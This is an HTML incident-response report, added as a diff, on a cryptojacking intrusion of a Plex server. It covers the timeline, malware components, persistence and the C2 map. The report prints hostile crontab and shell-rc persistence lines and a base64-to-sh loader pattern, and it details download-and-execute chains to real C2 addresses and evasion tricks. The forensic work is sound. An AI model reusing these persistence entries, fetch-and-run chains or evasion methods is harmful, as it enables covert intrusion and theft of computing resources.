+    <div class="tm">Oct 27, 22:03:14</div>
+    <div class="tx">Loader begins fetching the miner from the <strong>primary</strong> C2: <code>http://176.123.7.7/ks/ksoftirqd.vlog</code> (<code>ksoftirqd.dlurl</code> born). <code>/tmp/.local/share</code> created (HOME=/tmp artifact). Second-stage dropper <code>.i</code> (1,554 B) written ~22:10.</div>
+    <div class="src">stat crtime; round-3 artifacts</div>
+  </div>
+  <div class="ev ph2">
+    <div class="tm">Oct 27, 22:20:45</div>
+    <div class="tx">Miner fetch fails — <code>fetch_all_fail dest=/tmp/.cache/ksoftirqd</code> recorded to <code>ksoftirqd.dlerr</code>. Loader retries.</div>
+    <div class="src">malware state file</div>
+  </div>
+  <div class="ev ph2">
+    <div class="tm">Oct 27, 22:23:04–18</div>
+    <div class="tx">Miner binary <code>ksoftirqd</code> (9,657,791 B, XMRig rebrand "kswap 6.26.0") successfully staged from 176.123.7.7.</div>
+    <div class="src">stat crtime (birth 22:23:04)</div>
+  </div>
+  <div class="ev ph3">
+    <div class="tm">Oct 27, 22:23:30</div>
+    <div class="tx"><strong>MINING BEGINS.</strong> <code>ksoftirqd.json</code> config and <code>ksoftirqd.mlog</code> log created; miner pid 1338786 starts, name <code>ksoftirqd/0</code>, cmdline blanked with 42 newline bytes, RandomX dataset 2,336 MB, 8 threads → us.moneroocean.stream:443 (TLSv1.3, 205.172.58.170).</div>
+    <div class="src">stat crtime; mlog; /proc/3344711/cmdline</div>
+  </div>
+  <div class="ev ph3">
+    <div class="tm">Oct 28, 01:49 → 08:19</div>
+    <div class="tx">Burst of loader re-downloads: <strong>~116 polymorphic copies</strong> (<code>.b&lt;PID&gt;</code> / <code>.dl&lt;PID&gt;</code> pairs) written across <code>/tmp</code>, <code>/var/tmp</code>, <code>/dev/shm</code> — one pair per cron-triggered run that decided to refresh itself. Six distinct size/hash variants observed.</div>
+    <div class="src">round-3 sweep; SHA256SUMS</div>
+  </div>
+  <div class="ev ph3">
+    <div class="tm">Oct 28, 08:19</div>
+    <div class="tx"><code>.kpx</code> (473,676 B, variant <code>1ad8552e…</code>) written — an artifact on this crew's own <em>rival</em> kill-list, indicating <strong>a second actor was active on the host</strong> (§11).</div>
+    <div class="src">file mtime; round-3 sample-473676</div>
+  </div>
+  <div class="ev ph3">
+    <div class="tm">Oct 28, 09:25:01</div>
+    <div class="tx">Second loader instance generation (pids 1556693/94/95, variant <code>bc481e5e…</code>, exe <code>/tmp/.cache/.cpuhp690</code>) — cron respawned after an earlier instance died. Holds live C2 channel to <strong>85.137.54.178:18082</strong> (fd 0).</div>
+    <div class="src">ps lstart; ss -tanpo</div>
+  </div>
+  <div class="ev ph3">
+    <div class="tm">Oct 28, 10:06:47–48</div>
+    <div class="tx">Third persistence wave: <code>PlexScriptHost</code> born in plex home; loader instance from <code>/var/lib/plexmediaserver/.cache/.cpuhp690.loop</code> (pid 1573174).</div>
+    <div class="src">stat crtime; ps lstart</div>
+  </div>
+  <div class="ev ph3">
+    <div class="tm">Oct 28, 10:30:04</div>
+    <div class="tx">Masked-name generation: <code>CrashUploader</code> watchdog (14.9% CPU — actively scanning/killing rivals) + <code>PlexScriptHost</code> bot (pids 2299329, 2300043). Files <code>CrashUploader</code>, <code>PlexScriptHost</code>, <code>PlexTunerService</code> written into the plex home; backdoored plugin helper installed under <code>PlexScriptHost.bundle/</code>. 87 cron runs of CrashUploader follow. Another PlexScriptHost instance at 10:33:00 (pid 2400517). Live C2 to <strong>91.92.40.202:43365</strong> and <strong>72.14.179.64:443</strong>.</div>
+    <div class="src">ps lstart; stat; ss -tanpo</div>
+  </div>
+  <div class="ev">
+    <div class="tm">Oct 28, 11:00:56</div>
+    <div class="tx"><em>(Unrelated)</em> Operator attaches DisplayPort monitor — kernel logs <code>fbcon: Deferring console take-over</code>. The diagnostic session that will expose the intrusion has begun.</div>
+    <div class="src">journalctl -k</div>
+  </div>
+  <div class="ev ph3">
+    <div class="tm">Oct 28, 11:04:17</div>
+    <div class="tx">Loader performs miner maintenance: <code>stop_proc kill9 pid=1338786</code> — kills its own miner after <strong>45,681 s (12 h 41 m)</strong> uptime and immediately re-spawns it as pid 3344711 (confirmed by mlog reconnect at 11:04:18.267 and <code>age=1622</code> in .mstat at 11:32).</div>
+    <div class="src">ksoftirqd.died (epoch 1793203457); mlog</div>
+  </div>
+  <div class="ev ph4">
+    <div class="tm">Oct 28, ~11:30</div>
+    <div class="tx"><strong>DETECTION.</strong> 398%-CPU <code>ksoftirqd/0</code> owned by <code>plex</code> identified during console-fault triage. Load average ~5. Miner is mid-hash at ~1,190 H/s; heartbeat file updated 30 s prior.</div>
+    <div class="src">response session</div>
+  </div>
+  <div class="ev ph4">
+    <div class="tm">Oct 28, 11:33</div>
+    <div class="tx">Evidence collection executed (426 files, 58 MB; 13 process images recovered via <code>/proc/PID/exe</code> before termination; socket table captures the live C2 map of §9).</div>
+    <div class="src">collected-at.txt</div>
+  </div>
+  <div class="ev ph4">
+    <div class="tm">Oct 28, 11:34:52–11:35:12</div>
+    <div class="tx"><strong>Containment round 1:</strong> cron stopped → plex crontab wiped → Plex stopped → all uid-997 processes killed in 3 passes (21/16/18 PIDs — collateral, §13.3) → payload files removed → egress denied to 176.123.7.7 (and, mistakenly, 203.0.113.24) → cron restarted. Load still 5.37 (falling).</div>
+    <div class="src">containment.log</div>
+  </div>
+  <div class="ev ph5">
+    <div class="tm">Oct 28, ~12:20</div>
+    <div class="tx">Operator upgrades Plex 1.42.2 → <strong>1.43.5.11079</strong> (patched). Note: the exploit .so still existed at this moment — a restart before round 2 would have re-infected the host.</div>
+    <div class="src">dpkg</div>
+  </div>
+  <div class="ev ph5">
+    <div class="tm">Oct 28, 12:28:12</div>
+    <div class="tx"><strong>Containment round 2:</strong> exploit <code>zz55802.so</code>, boat-rc files and first-generation copies removed (45 artifacts). Full-filesystem hash sweep still finds 38 files of the <code>a0c56849…</code> variant in tmpfs. Egress to 80.87.206.86 denied.</div>
+    <div class="src">containment.log; round2-sweep.txt</div>
+  </div>
+  <div class="ev ph5">
+    <div class="tm">Oct 28, 12:36</div>
+    <div class="tx"><strong>Containment round 3:</strong> pattern-based enumeration removes the remaining <strong>116 polymorphic copies</strong> that hash-based sweeps had missed.</div>
+    <div class="src">response session</div>
+  </div>
+  <div class="ev ph5">
+    <div class="tm">Oct 28, 12:37</div>
+    <div class="tx">Final verification clean; every remaining plex process inside a legitimate <code>system.slice</code> unit; mis-deleted Mesa VA-API symlink restored; <strong>load average 0.39</strong>.</div>
+    <div class="src">response session</div>
+  </div>
+</div>
+
+<figure>
+<svg viewBox="0 0 1100 130" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI,Arial,sans-serif">
+  <text x="12" y="24" fill="#eef4fb" font-size="13" font-weight="700">Dwell anatomy (13 h 45 m total)</text>
+  <rect x="12" y="40" width="1076" height="34" rx="8" fill="#161d26" stroke="#243040"/>
+  <rect x="12"  y="40" width="11"   height="34" fill="#ff5c5c"/>
+  <rect x="23"  y="40" width="60"   height="34" fill="#ffb347"/>
+  <rect x="83"  y="40" width="826"  height="34" fill="#a78bfa"/>
+  <rect x="909" y="40" width="118"  height="34" fill="#38bdf8"/>
+  <rect x="1027" y="40" width="61"  height="34" fill="#4ade80"/>
+  <text x="496" y="61" fill="#eef4fb" font-size="12.5" text-anchor="middle" font-weight="600">MINING AT ~1,200 H/s — 13 h 12 m of accumulated miner runtime</text>
+  <text x="18"  y="94" fill="#8494a7" font-size="10.5">21:50 exploit</text>
+  <text x="53"  y="108" fill="#8494a7" font-size="10.5">21:51 cron live</text>
+  <text x="420" y="94" fill="#8494a7" font-size="10.5">22:23 miner starts</text>
+  <text x="908" y="94" fill="#8494a7" font-size="10.5">11:04 miner re-spawned</text>
+  <text x="911" y="108" fill="#8494a7" font-size="10.5">~11:30 detection</text>
+  <text x="1030" y="94" fill="#8494a7" font-size="10.5">11:35–12:37</text>
+  <text x="1032" y="108" fill="#8494a7" font-size="10.5">containment</text>
+</svg>
+<figcaption>Fig. 2 — Dwell-time anatomy: initial access (red), staging (amber), steady-state mining (violet), detection/response (cyan), remediation (green).</figcaption>
+</figure>
+<!-- ============ 6. MALWARE COMPONENTS ============ -->
+<h2 id="s6"><span class="n">6</span>Malware components — binary analysis</h2>
+<p>Four cooperating components were recovered and inspected. All samples were re-verified during this
+re-analysis with <code>file</code>, <code>readelf</code>, <code>strings</code>, and SHA-256 hashing against the preserved evidence set.</p>
+
+<h3>6.1 Stage 1 — exploit payload <code>zz55802.so</code> <span class="tag">ELF shared object</span></h3>
+<table>
+<tr><th style="width:220px">Attribute</th><th>Value</th></tr>
+<tr><td>Path</td><td class="mono">…/Plex Media Server/Codecs/&lt;machine-id&gt;-linux-x86_64/zz55802.so</td></tr>
+<tr><td>SHA-256</td><td class="mono">476af0a0dbf06f544732f86a902ebc27f873a50707d60b3330a63761b44045d4</td></tr>
+<tr><td>Size / type</td><td>1,036,800 B — ELF64 x86-64 DYN, BuildID <code>ce3bc04f…</code>, not stripped, GCC 13.3.0 (Ubuntu 24.04.1)</td></tr>
+<tr><td>Trigger</td><td><code>.init_array</code> constructor — executes on <code>dlopen</code>, i.e. <strong>every Plex startup</strong></td></tr>
+<tr><td>Imports / exports</td><td><strong>None</strong> — dynsym STRSZ = 1 byte; zero <code>FUNC</code>/<code>GLOBAL</code> symbols. Purely constructor-driven.</td></tr>
+<tr><td>Code footprint</td><td><code>.text</code> = 155 bytes; <code>.rodata</code> = 2,840 B (the base64 blob). All sections end at file offset 0x3220…</td></tr>
+<tr><td>Camouflage</td><td>…followed by <strong>~1.02 MB of trailing slack</strong> — the file is padded to sit size-wise among the legitimate ~1 MB Plex codec libraries</td></tr>
+<tr><td>Behavior</td><td>Sets <code>HOME=/tmp</code> + fixed <code>PATH</code>, then <code>echo &lt;base64&gt; | ( /usr/bin/base64 -d || /bin/base64 -d || base64 -d ) | /bin/sh</code></td></tr>
+</table>
+<p>The decoded 1,976-byte payload (Appendix C) kills 12 named rival miners, downloads the loader to
+<code>/dev/shm/.x</code> from <code>176.123.7.7/bins/1</code> (x86-64) with fallback to <code>/bins/4</code> (aarch64), executes it with
+<code>setsid … app-plex</code>, fetches and runs <code>/tmp/i</code> from <code>176.123.7.7/A-plex</code>, fires a landing beacon at
+<code>176.123.7.7/_land/p</code> (with a raw <code>/dev/tcp</code> bash fallback), and repeats the <code>/tmp/i</code> fetch from the secondary
+host <code>80.87.206.86</code> (port 80 → 18081) across wget/busybox/curl/python3/python fallbacks. It then plants
+<code>.i</code> in the first writable of <code>/data/git</code>, <code>/data/gitea/home</code>, <code>/home/git</code>, <code>/dev/shm</code>, <code>/tmp</code> —
+paths generic to this malware family (none of the gitea paths exist here).</p>
+<div class="callout crit">
+  <div class="t">Survivability note</div>
+  <p style="margin:4px 0">This component <strong>survived containment round 1 and the operator's Plex upgrade</strong>: it lives in writable state under
+  <code>/var/lib</code>, which the package manager neither owns nor overwrites. Had Plex been restarted between round 1 and round 2,
+  <strong>re-infection was certain</strong> — the upgraded, patched binary would have re-loaded the malicious .so on boot.</p>
+</div>
+
+<h3>6.2 Stage 2 — loader / bot "boatnet" <span class="tag">UPX-packed ELF</span></h3>
+<p>A statically linked x86-64 ELF with <strong>no section-header table</strong> (deliberate anti-analysis), packed with
+<code>UPX</code> (packer signature string present) and further string-obfuscated. Plaintext survivors include only
+<code>/proc/self/exe</code> and the four C2 endpoints <code>176.123.7.7:80/:443</code>, <code>80.87.206.86:80/:443</code> —
+the rest of its configuration is packed/encrypted, which is why its <em>live</em> C2 channels (§9) were only visible
+in the socket table. Self-identifies as <code>boatnet-unit-v2</code> / <code># boat-rc</code>; lock file <code>.boat.lock</code>;
+heartbeat <code>.cpuhp690.beat</code>. Its environment preserves <code>BOAT_LOCK_FD=200</code> and the transcode-session
+<code>PWD</code> (§4.2).</p>
+
+<table>
+<tr><th>Deployment location</th><th>Size (B)</th><th>Notes</th></tr>
+<tr><td class="mono">/tmp/.cache/.cpuhp690</td><td>473,610</td><td>primary cron target</td></tr>
+<tr><td class="mono">/var/lib/plexmediaserver/.cache/.cpuhp690</td><td>—</td><td>second cron target</td></tr>
+<tr><td class="mono">/var/lib/plexmediaserver/PlexScriptHost</td><td>473,826</td><td>masked name</td></tr>
+<tr><td class="mono">/var/lib/plexmediaserver/PlexTunerService</td><td>473,826</td><td>masked name</td></tr>
+<tr><td class="mono">…/Plug-ins/PlexScriptHost.bundle/…/Helpers/PlexScriptHost</td><td>473,826</td><td><strong>backdoored plugin</strong> — not part of the package, survives reinstall/upgrade</td></tr>
+<tr><td class="mono">/dev/shm/.x, /tmp|/var/tmp|/dev/shm/.b&lt;PID&gt;</td><td>various</td><td>polymorphic staging copies</td></tr>
+</table>
+
+<h3>6.3 Loader variant map — hash ↔ PID (from recovered process images) <span class="tag new">NEW FINDING</span></h3>
+<table>
+<tr><th>SHA-256 (prefix)</th><th>Size</th><th>Observed as</th></tr>
+<tr><td class="mono">a0c56849…</td><td>473,612</td><td>pids 1327450/52/53 — <strong>first-generation bot</strong> (stage-1 download → <code>.b1327455</code> re-copy); later re-fetched 38× into tmpfs during the 01:49–08:19 burst</td></tr>
+<tr><td class="mono">bc481e5e…</td><td>473,610</td><td>pids 1556693/94/95 — <code>/tmp/.cache/.cpuhp690</code> cron instance; parent of the final miner</td></tr>
+<tr><td class="mono">12f348f1…</td><td>473,826</td><td>pids 2300043/60/61 + 2400517/35/36 — <strong>PlexScriptHost-masked generation</strong>; also the original <code>/dev/shm/.x</code> from <code>bins/1</code></td></tr>
+<tr><td class="mono">2c27b231…</td><td>473,628</td><td>polymorphic copy (round-3 sample)</td></tr>
+<tr><td class="mono">62dde33d…</td><td>473,645</td><td>polymorphic copy (round-3 sample)</td></tr>
+<tr><td class="mono">1ad8552e…</td><td>473,676</td><td><code>.kpx</code> — rival-crew artifact (§11), preserved as sample-473676</td></tr>
+</table>
+
+<h3>6.4 Stage 3 — the miner: rebranded XMRig ("kswap 6.26.0") <span class="tag new">POSITIVELY IDENTIFIED</span></h3>
+<table>
+<tr><th style="width:220px">Attribute</th><th>Value</th></tr>
+<tr><td>Path / masquerade</td><td class="mono">/tmp/.cache/ksoftirqd — process name <code>ksoftirqd/0</code>, cmdline blanked with 42 × 0x0A</td></tr>
+<tr><td>SHA-256 / size</td><td class="mono">1a831ecbb318c97cccf4d7c0a09b61a56d774b50bfd9cb7cf87b83881c819792 — 9,657,791 B</td></tr>
+<tr><td>Build</td><td>ELF64 static, not stripped, BuildID <code>71d954d4…</code>; banners as <strong>kswap/6.26.0 gcc/13.3.0</strong> with <code>libuv/1.48.0 OpenSSL/3.0.13</code> — a rebranded <strong>XMRig 6.26.0</strong> (MoneroOcean algo-switching fork; embedded default config <code>.config/kswap.json</code>, wallet worker suffix <code>.fallback</code>)</td></tr>
+<tr><td>Target hardware</td><td>AMD Ryzen 3 5300U, 8 threads, AVX2 argon2, RandomX dataset 2,336 MB (no huge pages), assembly profile <code>auto:ryzen</code>, donate level 0%</td></tr>
+<tr><td>Pools (TLS, SNI, keepalive)</td><td class="mono">us. / de. / gulf. / sg.moneroocean.stream:443</td></tr>
+<tr><td>Wallet / worker</td><td class="mono" style="word-break:break-all">851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b <span style="color:var(--amber)">.c83c820d</span></td></tr>
+<tr><td>Observed rate</td><td>1,171–1,212 H/s (10 s instantaneous), 15-min average ~1,200 H/s; 11 shares accepted in the final 29.5-min log window</td></tr>
+<tr><td>Runtime supervision</td><td>State files <code>.mine</code>/<code>.mstat</code> (v=2) track hash, threads, PID, restarts (<code>wx=9</code>), errors (<code>er=13</code>); download URL <code>176.123.7.7/ks/ksoftirqd.vlog</code>; logs to <code>ksoftirqd.mlog</code></td></tr>
+<tr><td>Lifecycle</td><td>Started 22:23:30 Oct 27 (pid 1338786); killed by its own loader at 11:04:17 (age 45,681 s); re-spawned as pid 3344711; terminated at containment 11:35</td></tr>
+</table>
+
+<h3>6.5 Stage 2b — <code>.i</code> fallback dropper (shell)</h3>
+<p>1,554-byte POSIX shell script (full text in Appendix C): performs arch detection
+(<code>x86_64→1</code>, <code>i?86→2</code>, <code>arm→3d</code>, <code>aarch64→4</code>), kills 13 named rival miners (comment: <em>"Plex uid only.
+Exact comm, never pkill -f. Keep ksoftirqd (ours)"</em>), deletes rival drop files, downloads
+<code>http://176.123.7.7/bins/$arch</code> via wget → curl → busybox fallbacks into <code>/dev/shm|/var/tmp|/tmp/.dl$$</code>,
+copies to <code>.b$$</code>, and executes with <code>setsid</code>/<code>nohup</code>. The <code>.b$$</code>/<code>.dl$$</code> naming explains the
+116 PID-suffixed copies found on disk.</p>
+
+<h3>6.6 Watchdog scripts</h3>
+<p>Two shell-level guardians kept the operation alive (both reproduced in Appendix C):
+the <strong>heartbeat loop</strong> <code>.cpuhp690.loop</code> (45 s poll; if the beat is &gt;180 s stale, kill the PID in
+<code>.boat.lock</code> and relaunch) and the <strong>CrashUploader</strong> "Plex exclusive occupant" script (3,573 B), which
+combines cgroup escape, rival process killing, cron scrubbing every 60 s, firewall rules against rivals
+(root-gated), and booby-trapped rival drop paths.</p>
+
+<!-- ============ 7. PERSISTENCE ============ -->
+<h2 id="s7"><span class="n">7</span>Persistence mechanisms</h2>
+<p><strong>Six</strong> independent mechanisms were deployed. <strong>Four survived containment round 1</strong> — the initial
+kill-and-delete pass removed the running processes and primary payloads but not the deeper hooks.</p>
+
+<figure>
+<svg viewBox="0 0 1100 330" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI,Arial,sans-serif">
+  <rect x="14" y="14" width="1072" height="64" rx="10" fill="rgba(255,92,92,.07)" stroke="#8a2f2f"/>
+  <text x="550" y="40" fill="#ff5c5c" font-size="13.5" font-weight="700" text-anchor="middle">LAYER 1 — RE-ENTRY (survives full reboot)</text>
+  <text x="550" y="60" fill="#8494a7" font-size="11.5" text-anchor="middle">@reboot cron entries (×3, staggered sleep 8/15 s) + exploit .so in Plex Codecs dir (re-fires on every Plex start) + backdoored plugin bundle (survives package upgrade)</text>
+  <rect x="14" y="94" width="1072" height="64" rx="10" fill="rgba(255,179,71,.07)" stroke="#6b4a1a"/>
+  <text x="550" y="120" fill="#ffb347" font-size="13.5" font-weight="700" text-anchor="middle">LAYER 2 — SCHEDULED RESPAWN</text>
+  <text x="550" y="140" fill="#8494a7" font-size="11.5" text-anchor="middle">plex crontab: */3 min × 2 loader paths + * * * * * CrashUploader — rewritten every 60 s by scrub_cron() (304 + 87 logged executions)</text>
+  <rect x="14" y="174" width="1072" height="64" rx="10" fill="rgba(167,139,250,.07)" stroke="#463675"/>
+  <text x="550" y="200" fill="#a78bfa" font-size="13.5" font-weight="700" text-anchor="middle">LAYER 3 — IN-MEMORY SELF-HEALING</text>
+  <text x="550" y="220" fill="#8494a7" font-size="11.5" text-anchor="middle">.cpuhp690.loop watchdog: 45 s heartbeat poll, 180 s staleness → kill + relaunch · CrashUploader: 0.2 s rival-kill loop, bot_live() checks, ensure() respawn</text>
+  <rect x="14" y="254" width="1072" height="64" rx="10" fill="rgba(56,189,248,.07)" stroke="#1c5a7d"/>
+  <text x="550" y="280" fill="#38bdf8" font-size="13.5" font-weight="700" text-anchor="middle">LAYER 4 — DORMANT BACKUP HOOKS</text>
+  <text x="550" y="300" fill="#8494a7" font-size="11.5" text-anchor="middle">shell-rc in /tmp (.bashrc/.profile/.bash_profile — armed by HOME=/tmp) + systemd user units cpuhp690.service ×2 (staged, inert: not enabled, no lingering)</text>
+</svg>
+<figcaption>Fig. 3 — Defense-in-depth persistence stack. Killing the miner (layer 3) alone achieved nothing; cron had to be stopped first, and layers 1/2/4 required separate sweeps.</figcaption>
+</figure>
+
+<h3>7.1 The <code>plex</code> crontab (primary, active)</h3>
+<pre><span class="c"># rewritten every 60 s by scrub_cron() — grep-filtered against rival indicators</span>
+*/3 * * * * /tmp/.cache/.cpuhp690 &gt;/dev/null 2&gt;&amp;1
+@reboot sleep 15; /tmp/.cache/.cpuhp690 &gt;/dev/null 2&gt;&amp;1
+*/3 * * * * /var/lib/plexmediaserver/.cache/.cpuhp690 &gt;/dev/null 2&gt;&amp;1
+@reboot sleep 15; /var/lib/plexmediaserver/.cache/.cpuhp690 &gt;/dev/null 2&gt;&amp;1
+*  * * * * /var/lib/plexmediaserver/CrashUploader /var/lib/plexmediaserver/PlexScriptHost app-plex &gt;/dev/null 2&gt;&amp;1
+@reboot sleep 8;  /var/lib/plexmediaserver/CrashUploader /var/lib/plexmediaserver/PlexScriptHost app-plex &gt;/dev/null 2&gt;&amp;1</pre>
+<div class="callout warn"><div class="t">A reboot would NOT have remediated this host</div>
+<p style="margin:4px 0">Three <code>@reboot</code> entries plus the Codecs-dir <code>.so</code> (re-fired by Plex itself on start) plus the plugin-bundle
+helper mean a clean shutdown/restart cycle would have restored the full infection within seconds of boot.</p></div>
+
+<h3>7.2 Backdoored plugin bundle — the upgrade survivor</h3>
+<p><code>…/Plug-ins/PlexScriptHost.bundle/Contents/Helpers/PlexScriptHost</code> (473,826 B) replaced with the loader.
+<code>PlexScriptHost.bundle</code> is <strong>not</strong> shipped by the <code>plexmediaserver</code> package — <code>dpkg -L</code> has no entry — so
+neither reinstall nor upgrade touches it. Legacy plugin bundles (<code>PBS Kids.bundle</code>, <code>CouchPotato.bundle</code> remain)
+give this directory the perfect camouflage of age and legitimacy.</p>
+
+<h3>7.3 Shell-rc persistence</h3>
+<pre><span class="c"># boat-rc — /tmp/.bashrc, /tmp/.profile, /tmp/.bash_profile (identical, 87 B)</span>
+[ -x "/tmp/.cache/.cpuhp690" ] &amp;&amp; "/tmp/.cache/.cpuhp690" &gt;/dev/null 2&gt;&amp;1 &amp;</pre>
+<p>Effective because the stage-1 payload exports <code>HOME=/tmp</code>, so any shell the malware (or an operator
+inheriting that environment) starts sources these files.</p>
+
+<h3>7.4 systemd user units — staged but inert</h3>
+<p><code>cpuhp690.service</code> (<code># boatnet-unit-v2</code>, <code>Restart=always</code>, <code>RestartSec=20</code>) placed in both
+<code>/tmp/.config/systemd/user/</code> and the plex home. Assessed inert: no <code>*.wants</code> symlinks, and
+<code>loginctl show-user plex</code> reported "not logged in or lingering" — no user manager would ever start them.
+Removed regardless.</p>
+
+<!-- ============ 8. PROCESS TREE ============ -->
+<h2 id="s8"><span class="n">8</span>Process tree at detection (11:33, pre-termination)</h2>
+<div class="legend">
+  <span><i style="background:var(--red)"></i>malware (masquerading)</span>
+  <span><i style="background:var(--amber)"></i>malware (masked names)</span>
+  <span><i style="background:#3a4a5c"></i>legitimate</span>
+</div>
+<div class="ptree"><span class="pid">PID      PPID   START              ELAPSED   %CPU  COMM</span>
+<span class="pid">1327437</span> <span class="ok">1     </span>Oct27 21:50:15   13:43:31   0.0  <span class="mal">sh /tmp/.cache/.cpuhp690.loop   [watchdog]</span>
+<span class="pid">1327450</span> <span class="ok">1     </span>Oct27 21:50:15   13:43:30   0.5  <span class="mal">[kthreadd]   exe=/dev/shm/.b1327455 (a0c56849…)</span>
+<span class="pid">1327452</span> <span class="pid">1327450</span> Oct27 21:50:15   13:43:30   0.7  <span class="mal">[kthreadd]</span>
+<span class="pid">1327453</span> <span class="pid">1327450</span> Oct27 21:50:15   13:43:30   0.0  <span class="mal">[kthreadd]</span>
+<span class="pid">1556693</span> <span class="ok">1     </span>Oct28 09:25:01   02:08:45   0.0  <span class="mal">[kthreadd]   exe=/tmp/.cache/.cpuhp690 (bc481e5e…)  C2:85.137.54.178:18082</span>
+<span class="pid">1556694</span> <span class="pid">1556693</span> Oct28 09:25:01   02:08:44   0.9  <span class="mal">[kthreadd]</span>
+<span class="pid">1556695</span> <span class="pid">1556693</span> Oct28 09:25:01   02:08:44   0.0  <span class="mal">[kthreadd]</span>
+<span class="pid">1573174</span> <span class="ok">1     </span>Oct28 10:06:48   01:26:58   0.0  <span class="mal">sh /var/lib/plexmediaserver/.cache/.cpuhp690.loop</span>
+<span class="pid">2299329</span> <span class="ok">1     </span>Oct28 10:30:04   01:03:41  14.9  <span class="mal2">CrashUploader  [rival-kill loop]</span>
+<span class="pid">2300043</span> <span class="ok">1     </span>Oct28 10:30:05   01:03:41   0.0  <span class="mal2">PlexScriptHost (12f348f1…)  C2:91.92.40.202:43365 + 72.14.179.64:443</span>
+<span class="pid">2300060</span> <span class="pid">2300043</span> Oct28 10:30:05   01:03:41   1.0  <span class="mal2">PlexScriptHost</span>
+<span class="pid">2300061</span> <span class="pid">2300043</span> Oct28 10:30:05   01:03:41   0.0  <span class="mal2">PlexScriptHost</span>
+<span class="pid">2400517</span> <span class="ok">1     </span>Oct28 10:33:00   01:00:46   0.0  <span class="mal2">PlexScriptHost (12f348f1…)</span>
+<span class="pid">2400535</span> <span class="pid">2400517</span> Oct28 10:33:00   01:00:46   0.9  <span class="mal2">PlexScriptHost</span>
+<span class="pid">2400536</span> <span class="pid">2400517</span> Oct28 10:33:00   01:00:46   0.0  <span class="mal2">PlexScriptHost</span>
+<span class="pid">3344711</span> <span class="pid">1556693</span> Oct28 11:04:17   00:29:29   <span style="color:var(--red);font-weight:800">398</span>  <span class="mal">ksoftirqd/0   exe=/tmp/.cache/ksoftirqd  [MINER kswap 6.26.0]</span>
+<span class="pid">1380    </span><span class="ok">1     </span><span class="ok">(boot)              (61 days)   —   Plex Media Server — legitimate, kept alive deliberately</span>
+<span class="pid">1201-4  </span><span class="ok">1     </span><span class="ok">(boot)              (61 days)   —   prowlarr / radarr / sonarr / sabnzbd (uid 997, legitimate)</span></div>
+<p style="font-size:13px;color:var(--tx-dim)">PPid 1 on loader generations = cron-spawned, reparented to init. The miner is a child of loader pid 1556693.
+Malware processes held inherited fds 88/91 to a live Plex client session — proof of origin inside the Plex process tree.
+Full per-PID cmdline/environ/maps/fd evidence preserved under <code>proc/pid-&lt;N&gt;/</code>.</p>
+<!-- ============ 9. NETWORK ============ -->
+<h2 id="s9"><span class="n">9</span>Network connections &amp; C2 map</h2>
+
+<figure>
+<svg viewBox="0 0 1100 480" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI,Arial,sans-serif">
+  <defs>
+    <marker id="na" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#8494a7"/></marker>
+  </defs>
+  <rect x="420" y="190" width="260" height="110" rx="14" fill="#161d26" stroke="#38bdf8" stroke-width="2"/>
+  <text x="550" y="222" fill="#eef4fb" font-size="16" font-weight="700" text-anchor="middle">media-server</text>
+  <text x="550" y="243" fill="#8494a7" font-size="11" text-anchor="middle">192.168.x.x · uid 997 plex</text>
+  <text x="550" y="261" fill="#8494a7" font-size="11" text-anchor="middle">:32400 ALLOW Anywhere (ufw)</text>
+  <text x="550" y="281" fill="#ffb347" font-size="11" text-anchor="middle">[kthreadd] ×2 · PlexScriptHost ×2 · ksoftirqd/0</text>
+
+  <text x="150" y="42" fill="#ff5c5c" font-size="13" font-weight="700" text-anchor="middle">C2 / PAYLOAD DISTRIBUTION</text>
+  <rect x="40" y="60" width="220" height="58" rx="9" fill="#1d1420" stroke="#ff5c5c"/>
+  <text x="150" y="82" fill="#eef4fb" font-size="12.5" text-anchor="middle" font-weight="700">176.123.7.7</text>
+  <text x="150" y="99" fill="#8494a7" font-size="10.5" text-anchor="middle">/bins/1 · /bins/4 · /A-plex · /_land/p</text>
+  <text x="150" y="112" fill="#8494a7" font-size="10.5" text-anchor="middle">/ks/ksoftirqd.vlog · :80/:443 · 5× TIME-WAIT</text>
+  <rect x="40" y="140" width="220" height="46" rx="9" fill="#1d1420" stroke="#ff5c5c"/>
+  <text x="150" y="160" fill="#eef4fb" font-size="12.5" text-anchor="middle" font-weight="700">80.87.206.86</text>
+  <text x="150" y="177" fill="#8494a7" font-size="10.5" text-anchor="middle">:80/:18081 /A — all fetches timed out</text>
+  <rect x="40" y="330" width="220" height="58" rx="9" fill="#241016" stroke="#ff5c5c" stroke-dasharray="5,4"/>
+  <text x="150" y="352" fill="#ff9d9d" font-size="12" text-anchor="middle" font-weight="700">85.137.54.178:18082</text>
+  <text x="150" y="368" fill="#8494a7" font-size="10.5" text-anchor="middle">live loader channel (fd 0)</text>
+  <text x="150" y="381" fill="#f472b6" font-size="10.5" text-anchor="middle">NEW IOC — not in original report</text>
+  <rect x="40" y="404" width="220" height="58" rx="9" fill="#241016" stroke="#ff5c5c" stroke-dasharray="5,4"/>
+  <text x="150" y="426" fill="#ff9d9d" font-size="12" text-anchor="middle" font-weight="700">91.92.40.202:43365</text>
+  <text x="150" y="442" fill="#8494a7" font-size="10.5" text-anchor="middle">live PlexScriptHost channel (fd 95)</text>
+  <text x="150" y="455" fill="#f472b6" font-size="10.5" text-anchor="middle">NEW IOC — not in original report</text>
+
+  <text x="905" y="42" fill="#a78bfa" font-size="13" font-weight="700" text-anchor="middle">MINING POOLS (TLS 1.3, SNI)</text>
+  <rect x="790" y="60" width="230" height="72" rx="9" fill="#171226" stroke="#a78bfa"/>
+  <text x="905" y="84" fill="#eef4fb" font-size="12.5" text-anchor="middle" font-weight="700">us.moneroocean.stream:443</text>
+  <text x="905" y="101" fill="#8494a7" font-size="10.5" text-anchor="middle">205.172.58.170 — ACTIVE (fd 16)</text>
+  <text x="905" y="114" fill="#8494a7" font-size="10.5" text-anchor="middle">fp 239daadd… · keepalive</text>
+  <text x="905" y="127" fill="#8494a7" font-size="10.5" text-anchor="middle">diff ~2–3 M · rx/0</text>
+  <g font-size="11" fill="#8494a7" text-anchor="middle">
